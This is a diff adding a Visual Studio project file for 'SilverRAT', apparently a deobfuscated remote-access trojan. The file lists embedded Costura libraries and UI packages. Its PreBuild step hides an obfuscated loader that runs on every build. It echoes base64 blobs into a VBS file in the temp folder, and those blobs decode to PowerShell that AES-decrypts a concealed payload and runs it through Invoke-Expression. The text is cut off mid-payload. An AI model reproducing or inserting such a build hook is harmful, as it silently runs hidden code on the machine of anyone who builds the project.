@@ -1,0 +1,187 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>SilverRAT</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net48</TargetFramework>
+    <Prefer32Bit>True</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>10.0</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="costura.system.threading.accesscontrol.dll.compressed" />
+    <None Remove="costura.system.web.services.description.dll.compressed" />
+    <None Remove="costura.system.web.services.description.pdb.compressed" />
+    <None Remove="SilverRAT.exe.licenses" />
+    <None Remove="costura.bouncycastle.crypto.dll.compressed" />
+    <None Remove="costura.bunifu.licensing.dll.compressed" />
+    <None Remove="costura.bunifu.licensing.pdb.compressed" />
+    <None Remove="costura.bunifu.ui.winforms.1.5.3.dll.compressed" />
+    <None Remove="costura.bunifu.ui.winforms.dll.compressed" />
+    <None Remove="costura.cgeoip.dll.compressed" />
+    <None Remove="costura.costura.dll.compressed" />
+    <None Remove="costura.guna.ui2.dll.compressed" />
+    <None Remove="costura.microsoft.win32.registry.accesscontrol.dll.compressed" />
+    <None Remove="costura.microsoft.win32.registry.dll.compressed" />
+    <None Remove="costura.microsoft.win32.systemevents.dll.compressed" />
+    <None Remove="costura.newtonsoft.json.dll.compressed" />
+    <None Remove="costura.protobuf-net.core.dll.compressed" />
+    <None Remove="costura.protobuf-net.dll.compressed" />
+    <None Remove="costura.restsharp.dll.compressed" />
+    <None Remove="costura.system.buffers.dll.compressed" />
+    <None Remove="costura.system.codedom.dll.compressed" />
+    <None Remove="costura.system.collections.immutable.dll.compressed" />
+    <None Remove="costura.system.configuration.configurationmanager.dll.compressed" />
+    <None Remove="costura.system.data.odbc.dll.compressed" />
+    <None Remove="costura.system.data.oledb.dll.compressed" />
+    <None Remove="costura.system.data.sqlclient.dll.compressed" />
+    <None Remove="costura.system.diagnostics.eventlog.dll.compressed" />
+    <None Remove="costura.system.diagnostics.performancecounter.dll.compressed" />
+    <None Remove="costura.system.drawing.common.dll.compressed" />
+    <None Remove="costura.system.io.filesystem.accesscontrol.dll.compressed" />
+    <None Remove="costura.system.io.packaging.dll.compressed" />
+    <None Remove="costura.system.io.pipes.accesscontrol.dll.compressed" />
+    <None Remove="costura.system.io.ports.dll.compressed" />
+    <None Remove="costura.system.memory.dll.compressed" />
+    <None Remove="costura.system.numerics.vectors.dll.compressed" />
+    <None Remove="costura.system.runtime.compilerservices.unsafe.dll.compressed" />
+    <None Remove="costura.system.security.accesscontrol.dll.compressed" />
+    <None Remove="costura.system.security.cryptography.cng.dll.compressed" />
+    <None Remove="costura.system.security.cryptography.pkcs.dll.compressed" />
+    <None Remove="costura.system.security.cryptography.protecteddata.dll.compressed" />
+    <None Remove="costura.system.security.cryptography.xml.dll.compressed" />
+    <None Remove="costura.system.security.permissions.dll.compressed" />
+    <None Remove="costura.system.security.principal.windows.dll.compressed" />
+    <None Remove="costura.system.servicemodel.duplex.dll.compressed" />
+    <None Remove="costura.system.servicemodel.duplex.pdb.compressed" />
+    <None Remove="costura.system.servicemodel.http.dll.compressed" />
+    <None Remove="costura.system.servicemodel.http.pdb.compressed" />
+    <None Remove="costura.system.servicemodel.nettcp.dll.compressed" />
+    <None Remove="costura.system.servicemodel.nettcp.pdb.compressed" />
+    <None Remove="costura.system.servicemodel.primitives.dll.compressed" />
+    <None Remove="costura.system.servicemodel.primitives.pdb.compressed" />
+    <None Remove="costura.system.servicemodel.security.dll.compressed" />
+    <None Remove="costura.system.servicemodel.security.pdb.compressed" />
+    <None Remove="costura.system.servicemodel.syndication.dll.compressed" />
+    <None Remove="costura.system.serviceprocess.servicecontroller.dll.compressed" />
+    <None Remove="costura.system.text.encoding.codepages.dll.compressed" />
+    <None Remove="costura.system.threading.accesscontrol.dll.compressed" />
+    <None Remove="costura.system.web.services.description.dll.compressed" />
+    <None Remove="costura.system.web.services.description.pdb.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura - Kopyala.system.threading.accesscontrol.dll.compressed">
+      <LogicalName>costura.system.threading.accesscontrol.dll.compressed</LogicalName>
+    </EmbeddedResource>
+    <EmbeddedResource Include="costuraDLL\costura - Kopyala.system.web.services.description.dll.compressed">
+      <LogicalName>costura.system.web.services.description.dll.compressed</LogicalName>
+    </EmbeddedResource>
+    <EmbeddedResource Include="costuraDLL\costura - Kopyala.system.web.services.description.pdb.compressed">
+      <LogicalName>costura.system.web.services.description.pdb.compressed</LogicalName>
+    </EmbeddedResource>
+    <EmbeddedResource Include="SilverRAT.exe.licenses" LogicalName="SilverRAT.exe.licenses" />
+    <EmbeddedResource Include="costuraDLL\costura.bouncycastle.crypto.dll.compressed" LogicalName="costura.bouncycastle.crypto.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.cgeoip.dll.compressed" LogicalName="costura.cgeoip.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.costura.dll.compressed" LogicalName="costura.costura.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.guna.ui2.dll.compressed" LogicalName="costura.guna.ui2.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.microsoft.win32.registry.accesscontrol.dll.compressed" LogicalName="costura.microsoft.win32.registry.accesscontrol.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.microsoft.win32.registry.dll.compressed" LogicalName="costura.microsoft.win32.registry.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.microsoft.win32.systemevents.dll.compressed" LogicalName="costura.microsoft.win32.systemevents.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.newtonsoft.json.dll.compressed" LogicalName="costura.newtonsoft.json.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.protobuf-net.core.dll.compressed" LogicalName="costura.protobuf-net.core.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.protobuf-net.dll.compressed" LogicalName="costura.protobuf-net.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.restsharp.dll.compressed" LogicalName="costura.restsharp.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.buffers.dll.compressed" LogicalName="costura.system.buffers.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.codedom.dll.compressed" LogicalName="costura.system.codedom.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.collections.immutable.dll.compressed" LogicalName="costura.system.collections.immutable.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.configuration.configurationmanager.dll.compressed" LogicalName="costura.system.configuration.configurationmanager.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.data.odbc.dll.compressed" LogicalName="costura.system.data.odbc.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.data.oledb.dll.compressed" LogicalName="costura.system.data.oledb.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.data.sqlclient.dll.compressed" LogicalName="costura.system.data.sqlclient.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.diagnostics.eventlog.dll.compressed" LogicalName="costura.system.diagnostics.eventlog.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.diagnostics.performancecounter.dll.compressed" LogicalName="costura.system.diagnostics.performancecounter.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.drawing.common.dll.compressed" LogicalName="costura.system.drawing.common.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.io.filesystem.accesscontrol.dll.compressed" LogicalName="costura.system.io.filesystem.accesscontrol.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.io.packaging.dll.compressed" LogicalName="costura.system.io.packaging.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.io.pipes.accesscontrol.dll.compressed" LogicalName="costura.system.io.pipes.accesscontrol.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.io.ports.dll.compressed" LogicalName="costura.system.io.ports.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.memory.dll.compressed" LogicalName="costura.system.memory.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.numerics.vectors.dll.compressed" LogicalName="costura.system.numerics.vectors.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.runtime.compilerservices.unsafe.dll.compressed" LogicalName="costura.system.runtime.compilerservices.unsafe.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.security.accesscontrol.dll.compressed" LogicalName="costura.system.security.accesscontrol.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.security.cryptography.cng.dll.compressed" LogicalName="costura.system.security.cryptography.cng.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.security.cryptography.pkcs.dll.compressed" LogicalName="costura.system.security.cryptography.pkcs.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.security.cryptography.protecteddata.dll.compressed" LogicalName="costura.system.security.cryptography.protecteddata.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.security.cryptography.xml.dll.compressed" LogicalName="costura.system.security.cryptography.xml.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.security.permissions.dll.compressed" LogicalName="costura.system.security.permissions.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.security.principal.windows.dll.compressed" LogicalName="costura.system.security.principal.windows.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.duplex.dll.compressed" LogicalName="costura.system.servicemodel.duplex.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.duplex.pdb.compressed" LogicalName="costura.system.servicemodel.duplex.pdb.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.http.dll.compressed" LogicalName="costura.system.servicemodel.http.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.http.pdb.compressed" LogicalName="costura.system.servicemodel.http.pdb.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.nettcp.dll.compressed" LogicalName="costura.system.servicemodel.nettcp.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.nettcp.pdb.compressed" LogicalName="costura.system.servicemodel.nettcp.pdb.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.primitives.dll.compressed" LogicalName="costura.system.servicemodel.primitives.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.primitives.pdb.compressed" LogicalName="costura.system.servicemodel.primitives.pdb.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.security.dll.compressed" LogicalName="costura.system.servicemodel.security.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.security.pdb.compressed" LogicalName="costura.system.servicemodel.security.pdb.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.servicemodel.syndication.dll.compressed" LogicalName="costura.system.servicemodel.syndication.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.serviceprocess.servicecontroller.dll.compressed" LogicalName="costura.system.serviceprocess.servicecontroller.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.text.encoding.codepages.dll.compressed" LogicalName="costura.system.text.encoding.codepages.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.threading.accesscontrol.dll.compressed" LogicalName="costura.system.threading.accesscontrol.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.web.services.description.dll.compressed" LogicalName="costura.system.web.services.description.dll.compressed" />
+    <EmbeddedResource Include="costuraDLL\costura.system.web.services.description.pdb.compressed" LogicalName="costura.system.web.services.description.pdb.compressed" />
+  </ItemGroup>
+  <ItemGroup>
+    <PackageReference Include="Bunifu.Charts.WinForms" Version="2.0.0" />
+    <PackageReference Include="Bunifu.Dataviz.WinForms" Version="2.2.1" />
+    <PackageReference Include="Bunifu.UI.WinForms" Version="6.3.0" />
+    <PackageReference Include="Bunifu.UI.WinForms.1.5.3" Version="2.0.0" />
+    <PackageReference Include="Bunifu.UI.WinForms.Deprecated" Version="2.0.0" />
+    <PackageReference Include="Bunifu.Utils" Version="1.0.5" />
+    <PackageReference Include="Google.Protobuf" Version="3.26.0" />
+    <PackageReference Include="Guna.UI2.WinForms" Version="2.0.4.6" />
+    <PackageReference Include="H.IpInfo" Version="1.0.1" />
+    <PackageReference Include="Helpfulcore.GeoIp" Version="1.0.9" />
+    <PackageReference Include="MaxMind.GeoIP" Version="2.1.17" />
+    <PackageReference Include="protobuf-net" Version="3.2.30" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="Guna.UI2">
+      <HintPath>D:\RE\deobf\silverrat\Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="Bunifu.UI.WinForms">
+      <HintPath>D:\RE\deobf\silverrat\Bunifu.UI.WinForms.dll</HintPath>
+    </Reference>
+    <Reference Include="Bunifu.UI.WinForms.1.5.3">
+      <HintPath>D:\RE\deobf\silverrat\Bunifu.UI.WinForms.1.5.3.dll</HintPath>
+    </Reference>
+    <Reference Include="cGeoIp">
+      <HintPath>D:\RE\deobf\silverrat\cGeoIp.dll</HintPath>
+    </Reference>
+    <Reference Include="protobuf-net.Core">
+      <HintPath>D:\RE\deobf\silverrat\protobuf-net.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="BouncyCastle.Crypto">
+      <HintPath>D:\RE\deobf\silverrat\BouncyCastle.Crypto.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Xml" />
+    <Reference Include="protobuf-net">
+      <HintPath>D:\RE\deobf\silverrat\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+  </ItemGroup>
+  <ItemGroup>
+    <Folder Include="EncryptString\" />
+  </ItemGroup>
+  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+    <Exec Command="@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\a&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;ZnVuY3Rpb24gRFZLIHtwYXJhbSAoW3N0cmluZ10kZW4sW2J5dGVbXV0kc0IpOyRrID0gTmV3LU9iamVjdCBieXRlW10gMzI7JHYgPSBOZXctT2JqZWN0IGJ5dGVbXSAxNjskZGVyaXZlQnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRlbiwgJHNCLCAxMDAwLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1Nik7JGsgPSAkZGVyaXZlQnl0ZXMuR2V0Qnl0ZXMoMzIpOyR2ID0gJGRlcml2ZUJ5dGVzLkdldEJ5dGVzKDE2KTtyZXR1cm4gQHsgSyA9ICRrOyBWID0gJHYgfX07ZnVuY3Rpb24gRCB7cGFyYW0gKFtzdHJpbmddJGVCWixbc3RyaW5nXSRlbmMpOyRkQnkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlQlopOyRzYnkgPSAkZEJ5WzAuLjddOyRlQnkgPSAkZEJ5WzguLigkZEJ5Lkxlbmd0aCAtIDEpXTskZHJ2ID0gRFZLIC1lbiAkZW5jIC1zQiAkc2J5OyRrID0gJGRydi5LOyR2ID0gJGRydi5WOyRhID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCk7JGEuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkM7JGEuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzc7JGEuS2V5ID0gJGs7JGEuSVYgPSAkdjskZGMgPSAkYS5DcmVhdGVEZWNyeXB0b3IoKTt0cnkgeyRkQiA9ICRkYy5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRlQnksIDAsICRlQnkuTGVuZ3RoKTtyZXR1cm4gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGRCKX0gY2F0Y2gge3JldHVybiAkbnVsbH19JGVCID0gImlRNElUWE5lWUZqV0pMOFVieDZpa1ArV2hvS1d1Mk41VWtQNG9QZjh1OFZFUi9Hc0IwZWhmcEVsZTlIODdxU0JhVjZYTUFjUFFjZVlHNjVrWjJjUitmYmVJS25PMU43Z2FuaERjdHNxdXU1UVNremJDbzdRekIrRmdELzQxamVSVjV6L1NtMU0zVWt0aGFhK2F4SWJad0tBek9Nc0V4VjlETTVxNGRLNEdVZmZkZTJiQis4RktuS3krU2ZhYzkvaEQyTDE2TzVDK3l6S2FNUUZuaWkxb3hkZHdGSWc0dHFLVE9ScXNHcGxPdmdoSUR4WTBBUWhvYjFxWkRYdzZSUkpXcTY2dFhNQWJrM3UrOVYxdUF4cFFVeHgzU1BaVTcra01ySDVlR0Mzbkk3VkdnSHpHcmlBWlZCdmJZbS9QbHlqQ0xpell5K1lJbjBRZlhQUVpmL1hUY1ZkNTV1eGZCYWZXdlEraTlwT3RVcDhSVkg5K2VTQ29EZ2YrdFJLSGpaWXBwbEVIS3N6aml2Q3pNRzc0STFiRk1VVE0xK3ZMV3FrV1QwS1R6MlYyRzVXVkh5U1ByeUdtOTgrYjdReU1jWEk0NGFyVG5kSDFYeGRVOWh1bzM3d1FNekgya25wa0tOVERoZlJSR0NwRkxsM1Vxa0xmRW9mN1lvaTQ2WWQvdWxrL0VKdWF2R0hMUUM0V0hvZUJpT0NrS1g3cjN5NjkvL2hJT0pVMmRuRkFTa3RxVHNUNDBiZnZGaGpTTUhrSFZkbHJ1TFlzbUVxbHVpc3lWc09hSm9XWTRDemIxM1QyMU8vbVNEQ0ZMRFJhRitYVDhSNEZUWE8wenN2Z1dLdDI2aWt4eGkyN29oejNFVlY2Q0U5MFEwSWR3N0U0TVR1SzFBTDBrR2c3ZG43TkorUEl6YmJ6N3lUYWRHTkg4SzVEY3A4VGZwQkd6aVdmTlU2cVkyRTNtV2c4NzA5UmFNMmhFTU1nQ1Z0YlpGdkZMQXkyTXYwTDJYaTR2VXl4UEFBNHRMMnNlN2NqTVNCU2g4REIwOEpxeGNMVjNQN0pLL0RFeVRZSU9GSkRvN0toRktsUlB0bVpoZk5rRjl3ZWpYRVk3czdISWJpeXFhRkNWNm1DK09CNDZSZ2YyK3pKVjB2RGlIeXlDdHZZUEhqSWlwRGhkK2hJSEhqQk1ZOGxMeEUrRGFZemEwbC9vMUVvOWpQV2lkekVNdUpTaFZMclBSOXI1UjYvQ1lYS0tjOGpBdUNvZ3hSR0xMSk81eDM3ajZWK1ZxSXQ3ZFEzZ0EydXNJTHFsUHRpUWg2dUdYa0JYanJSWnFzSnBxeElTSlBaclNIQlJCSDNmQlBFVkZyZi9XMTZOMk1uNEp3cGo3NnJlRStLMnZPZWpyZXIxbW9acHpYKzI0K09wZmJwM3NPSlVzMWJOYWErcmV4VW5VNUN2SzV2RlF1VmRvaW5PM0w5eTE2NEdjdC9EaERnbDJJSjFhVTdaWWErN3o3VnVYVGdQdGMr&quot; &gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo c = &quot;ajd6em1UMWtBbnJDMkJjdFc0UGZzSWhsQVBzTHJPSHhGd2lFK0JRNmVmK2gxT0xxdFlCUFJuMEw4NWZ1VmRNeTFhZWhpbVB0ZHVvTGdKQjhiLzcvMGx6NDBsNnVTdlNPd1AyRXJtRXIxRC83ZFQyVzEwYkFJU1kxNTRubENxNDg3VEpwMi90ZHhJZUluNkNsK1NjRHhHTFgvSkQ1eDRpOHRSQi9DcEhsL0tQUmpDUmplOGtnZTNTNW5RZlprd3JOTVdaeHNUNXVjN0xkZ25jcmVpM3pZenpFTThWemdYcDM0TEdnMHY3d3VDeVdrcEZJS2xxY0x2WXI1ZXpSblJjalVNSkxLMzVhbzFoUnBKK0tlU2dBTVdXWlQxdmZrQkZwcDdFTVdnN0Foc3ZXZnZITWhNbGRoL3VuT3phQWFxTW1WdWt1OS94SGxnWk5XYkRSY0xVYmhkbkpSZGJleTQ0MWcwWVZ6b1BzU2haL29JbXhLNmVxQUtIYk1nZU1XUzRlaUREZlhhckhqbWNNdDFiZTBONWJkVGVlSXN5bTNvc3M3WGRDSmdnaUY0TXQvUlc2UC9UUFgwdU1QNzZKaEd6dmowT1dFOXI4LzlWWkZ4aGEzSS8vSVFUVnBhMEUzVytCbHVKblk0clVYdE93Z2hpdVpoTUZtNkNJZ0diWC93Tnl3RzJmYU5iVnRBM2VMWXYwcHM2Wm9MbXRrYkl3VzBSOWsrSFF4WW43aVZkekFxMkEwdndzVE5EQlROZ2pkdStEcU5ZUHpFQWZBOWs4d0xLTnpSVnNVcm1EOWdZTktWSk41ZWUySGg3QXI1WlhyeEtkdjF5ZXdaQ3N5ajZ0S2ppQWV6QmZLMXVuQmNSYmVwNGhqNDN5V0Z1bnJPWVM3Z3JUQXF1TUZRbTl4bktwalVYMkpzYm5acEhlZE51OVlGMnJldW84Rm9nRUhJVEs5VE5UYWZpM01vdjlGN2l5TFhtNWNhVFBvaUlpUDdHK21zWlk1VDZlNDI1aTNsb2Z1MXhYOVRpdDlZQlQ2eVhCT3Mvd2dvalNxcVcwN3lhLzgvQTRsZUxLSjFIangvajFwSTJWUEFMY0I2d2ZoQXBtUUtFNXZoT0N6N0l5Vk5KTklXVHd5YzFERlN3bDY4V1BGYmZHT0N6U3NYTkxtYVQ4Tk95YXd5MDVNZTRCd2ZGck11MHhid0ZPNzlMM2FORXFTc1FvQjN5OHdPdlcvd243VkZuNUo5cE9mZnR2ZUM5blFxcnluU0Q5Q3RnVy9FZ2pBRzFFUjFZZjJqTnF1WlRxeVlXaUNuaUJoQXNyZC93UktxdW5zRXZJMS80M1hscEFzdG5uVFZpUkgzM2J5Wk0rYXVPTjFqd3lTWHdFbmZKZXdSOHlEZktLdjZ2dkhHSFhXVEY3NUVuUW53YnBkVGU2RUZQT2JCOFpSZ3NoazdWei9HTlEzQkZKcmp5VURsSHpWTWJUa3Mydm5wcTBuNWx2NDdhZ2dueUlyaGVWcXRyb09BMVdZekdhT0oyYzFiRU5RYjJObnRjdE9CeVYyWkhxK3Zhb2N6K1dwVWFPcXRVcmFITk5zSHNLRC9ibktON01rcTZHU0FiRzllUEdUckUwYlN5bmJKb2djMFYvVmlPUW8ybkc4MW80aFhEbFIvWXMyc29JamRkdnlTNDg3cDVCR0dzZEJITGVOTVBuMGdYMFBOUXpVWGhoNlVTc0UyQkJiNGdrMzFoMEZ2VlpRa1NYREk1dDRHMWdoZVVLWkZYWGVYY1NHZngvVHN4U3ZXMFFqUUh1WTZDN0Y3cXI4VEplWmlRY0FoWVhWZVdaTHBuM3Jwa082L0c1dDU0Y01odC9ZYjZ1WERPUGJPNHRDR3FobEZtY0lXWncyc3ZoVktyTkpGOUtUYlgydk00bDhiNFpwSzFxVWNUanRUQUhNc1ExZktvTnlqV2xiTGdKc3A1M0lCa082ZFp3UmFpbFU5VVpiWll4ejNpZW55TDcyVmtUM0pIeXlSek1JMUNMaG9HOVFMbHRoOE8ydzVHQ1lldGVLZnd3YkpLenRQTlRVQ2padXRvYmFSTFBHKzR4MnQrMjhhVEp2VGlLd2ZLU0dIOE9BK3dpWFVsbjJJT0lTTzNVbkh2UVZCUlJjN1FHM25sb09OdmRCVEVPcGVmbGVYTHB5YTZTd2psTnlmOUtxeUs2b1IwTWxsOWpQdGlQSktLNmFsTjd3cWgrYTczakYzeHhjeDdjUWozdWx1U0toU2pzdW1yLzJTdFpZSVgxRUxOeHkvVHZFcHZXV2tsZko2UmRQbVhGcHNlVGFkVWMyeiI7JHRtID0gJGVCLlRvQ2hhckFycmF5KCk7W2FycmF5XTo6UmV2ZXJzZSgkdG0pOyRSID0gRCAtZUJaICR0bSAtZW5jICIiOyR0ID0gJFIuVG9DaGFyQXJyYXkoKTsgW2FycmF5XTo6UmV2ZXJzZSgkdCk7ICRCVlYgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0KSk7ICRFUFggPSAiSW52b2tlLUV4cHJlc3Npb24iOyBOZXctQWxpYXMgLU5hbWUgcFdOIC1WYWx1ZSAkRVBYIC1Gb3JjZTsgcFdOICRCVlY=&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo d = &quot;OG5pZzBJR05SWWlYK1gwcHk1VktkekJsS2UrdmZtQlROcVE3dEUyQVdzaE4zWVZ6dXEwWUQ3eGZJcHM5d041bms0YkZaVGJLR3R1Tk5yM0ZadTdySng0T25MYzhCaVhFdDNxdExON0Z3VDFPUDNLcm5OS2lOR2ZzRy9rSllPUXEyQkdkTy9zSEtZTTdiWWQ5N09rSURZKzl6bDJScTA1K2VMd2p5QzM3VlNpOVVGYWVQR0gyS0tINWpYcnhNZjJ2dE5rRWtTZlZ3WXNnNDFrMy9NYjk5R1NzZjYvMkxocVlsVmpHOEJ6bGJsaUdGcUhSZzZPYjFsdnBDWGpRSEE4QytlVmtsWVFEdEx5Mkh0OFZsQjdLaXF0ZFppaEdrY28zVjZENFRNU2RWalBodSsyM2d6TkI1NFYrQkpuaWdKMlJpNTBVYzUxK2JRMmN2dEpHbmNpb1dmRUZEWFgxMFhsaEFNcm5jUGJaQTZWRk1jOGxDYi9KVHF1UEN0RjJxL1hyU1hNYXBLL0lvVEF2MU0rL1RtblFtQkNCa1VqbUlGSXZzU1MxZktPL2ZSVkJXU05GNWVGSFFycEMvdEJqL0FDNldOc0gxNlZnd21vQ1VzdU05MDM4N1J0b0xzM2JpODNxeWhPVGs1OWE2cFhvTUJpUENXOXZ2R0VpNUljRUhXcW5DQlVzNE1FYWxYdndLcGlsVDcrdElxL1JxMlVPaHhCNjNEVlJlUGFNMTZCZ2lOd1BncGlud3hqd0k5ZlVFdVBYb3ZKTnMrenhFN0JkTU43RVJYTzNVblZQM1ErZzRianJiWXFzWUJnUm5UdElucEpjSjVDSEVOSis1ZXlDc0RJZ2dYV1F3K0R2VTRBZ09zUUlXL2hNK0Fha1FrMU50MnVBT0tYUGJyWEpyTUlZWXo1UHlLVWpEekl2R3phSE9zUmZ0d21YSU54ZHdMY2FJQitmOGVNTjlVaFJRbGt6b3F4MHE4QWxFL1hZeXIwc3dWbzBpR0N4NVBvTjdHTUZFVFJOZk5mbG1hWEgrQk10M1QvUmlkWkV6ZTBRdDhTRWhnNkFCQ21IZ3QrdnJWNjRRK0NlYUxiZTBuYmJEbER6d2ptSFltVllTcTdXZW1rK2R1aGYxK1hObVhtNCtSZDlaVWdNN21wcGxCY1VsSS96dm94RUdZKzcwU05Gb25sOWZvakdrdDRFdmJrMUNvYm43dGtnczBjbWh4QmRkUkNyakxOY014bGE4T2xxeDI1amxwZGNCREMxZ1MwZS83c3NyTk14L3hMdGJ6dkltUmJWMWpHaXhLMk1WS1R0N1lpVU13L1FnQTRCenk4dTcycGI1cHRWc2M0cHRob2tUekdaMVo1YkhhbTZSeUhKK3MrZytFbEkzcW02Vm9qVnhTSmMxci9lMVRIR2hYSlRVYk41OGtrZ21iQldHenN3d1ZHb2orVk5iRlV0MVE2TUxENGlEWnYrczd5djBiMWU5QnA5Z0FGSGc4M09vVGc3d3VLTGFMTXhqL2FBRzBuQlBydTRBa04xZkVkSXcvb1hFYXptdWdVcXNtc2xYYU92OHA4VHFZUjhsMmp6bVBkcnlxSXB5Q1JZOGtHT3VaK3kyTEFKY1pzMUMyeHZacVZBL1NRR21NWjdIQnB1RlE5cklrMEtIQnFYUnpuL0tJMmJRbENDVlFzSGhmVUZnL2FaRDlQMWZaaHJUM2ZobEs4ajJibC9scTVBTkJjQ1VKcE5Kb1RDQW1XbmRycnRJbGRIVnRpMnYyTlNXSFBzNzRUeGNrUmRsdndsdmlIUmFvWXprOWRiNDNUamhoZVZtcThKeURNdlR3TWNHZitOUzg5Q09iUk9wd095eHdxc3I1ZGJLdkNWdzZLaEU4R1VjN0lHNjc5SFZCcDZldzlnK25YeS8zWDJYQ3pQVi8rTCtRbmMxVFdFSjZ4cER0YzluTExZbDNURnJBelZaTzJteGFCNTRCQ0lIUW9nZ1R5RmZjYkVUV2ZIZjQ1UmdTUk5STk10a3lDdVJUQ2thWkV1NFQ2YWtLL0ZWRVhCSjl1WHV0eHFuUUJlZmYrUnNQckNpNFI4b3ZnaUxIaTVsczM3OGsrdWhiaGxlVUJwK2tCd1c5aEFpN1pmTERZQ0MrRG1OSjFIKzRyY2pXT09LRDZvazNLVUorK2RpaVdhcXFqclh2SEI4SWpwSEh2Z0xDSjAxa01tR2FNU3loSFFQWCtQcFFhSjU5ZUxYcnl1TEpodzR6Rkd6R3VLTkNRT2lsY1pnb05CK1I0WTlJb1ZhbUxMd29sV1hQeXU3WnBhYUtSS1E0VlJwNEhkekpPOCtQMy9IWmcvY2pJK2FPbmpHdzBTd29maWVidlc1UkJ